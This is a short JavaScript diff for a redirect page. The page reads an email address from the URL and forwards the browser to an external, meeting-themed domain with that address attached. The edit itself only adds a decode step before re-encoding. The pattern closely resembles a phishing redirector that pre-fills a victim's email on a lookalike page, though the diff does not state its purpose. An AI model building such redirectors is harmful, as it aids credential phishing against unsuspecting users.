@@ -8,11 +8,13 @@
     const email = params.get("email");
 
     if (email) {
-      // Redirect to the actual target with the email encoded properly
-      const target = `https://e-meetings.srcv-inc0645.de/u?email=${encodeURIComponent(email)}`;
+      // If you need to show it in human-readable form:
+      const decodedEmail = decodeURIComponent(email);
+
+      // Redirect to the target URL (still encoded is fine for redirect)
+      const target = `https://e-meetings.srcv-inc0645.de/u?email=${encodeURIComponent(decodedEmail)}`;
       window.location.replace(target);
     } else {
-      // If no email provided, show error or fallback
       document.addEventListener("DOMContentLoaded", function () {
         document.body.innerHTML = "<p>Error: No email parameter found.</p>";
       });
